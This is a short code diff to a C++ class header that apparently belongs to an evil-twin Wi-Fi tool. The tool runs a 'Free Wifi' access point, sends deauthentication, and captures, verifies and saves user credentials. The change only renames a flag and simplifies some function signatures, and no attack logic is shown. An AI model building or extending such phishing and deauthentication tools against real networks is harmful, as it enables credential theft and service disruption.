@@ -38,6 +38,7 @@ private:
     String apName = "Free Wifi";
     uint8_t _channel;
     bool _deauth;
+    bool isDeauthHeld = false;
     bool _verifyPwd; // From PR branch
     AsyncWebServer webServer;
 
@@ -49,7 +50,6 @@ private:
     String htmlPage;
     String htmlFileName;
     bool isDefaultHtml = true;
-    bool temp_stop = false;
     FS *fsHtmlFile;
 
     String lastCred;
@@ -64,7 +64,7 @@ private:
     bool verifyCreds(String &Ssid, String &Password);
     void restartWiFi(bool reset = true);
     void resetCapturedCredentials(void);
-    void printDeauthStatus(bool);
+    void printDeauthStatus(void);
     void printLastCapturedCredential(void);
     void debounceButtonPress(void);
     void loadCustomHtml(void);
@@ -72,7 +72,7 @@ private:
     void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
-    void drawScreen(bool holdDeauth);
+    void drawScreen(void);
 
     String getHtmlTemplate(String body);
     String creds_GET(void);
